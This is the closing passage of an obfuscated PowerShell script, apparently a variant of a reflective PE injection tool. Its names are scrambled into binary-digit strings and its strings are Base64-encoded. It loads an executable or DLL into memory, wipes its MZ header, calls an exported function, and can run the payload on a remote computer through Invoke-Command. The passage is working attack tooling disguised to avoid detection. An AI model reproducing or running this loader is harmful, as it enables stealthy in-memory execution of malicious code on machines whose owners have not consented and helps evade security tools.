				    ${00010111100000010} = _10000101101101101 @() ([Void])
				    ${00001010111001011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01011100111001110}, ${00010111100000010})
				    ${00001010111001011}.Invoke() | Out-Null
	            }
	        }
		}
		elseif ((${_00101101001101101}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${_10100101101101111} -ne [IntPtr]::Zero))
		{
			${01011100111001110} = _01010100101101001 -_10100111001011110 ${_10100111001011110} -_01111111011000110 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${01011100111001110} -eq $null) -or (${01011100111001110} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${01011100111001110} = _01001111001101000 ${01011100111001110} ${_10100111001011110}
			${01011100111001110} = _01100001001101001 ${01011100111001110} ${10110001101110101}
			${01110111000111100} = _10101101011101000 -_01100001010100111 ${_10100101101101111} -_10100000001011100 ${01011100111001110} -Win32Functions $Win32Functions
		}
		if (${_10100101101101111} -eq [IntPtr]::Zero -and ${_00101101001101101}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			_10101110111010011 -_10100111001011110 ${_10100111001011110}
		}
		else
		{
			${01110110101110011} = $Win32Functions.VirtualFree.Invoke(${_10100111001011110}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${01110110101110011} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	_10111111001000001
}
Function _10111111001000001
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	${01010101000001011} = ($PEBytes[0..1] | % {[Char] $_}) -join ''
    if (${01010101000001011} -ne 'MZ')
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuAA==')))
    }
	if (-not $DoNotZeroMZ) {
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQAgACQARQB4AGUAQQByAGcAcwA=')))
	}
	else
	{
		$ExeArgs = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQA=')))
	}
	if ($ComputerName -eq $null -or $ComputerName -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${00110110111111101} -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		icm -ScriptBlock ${00110110111111101} -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}
_10111111001000001
}
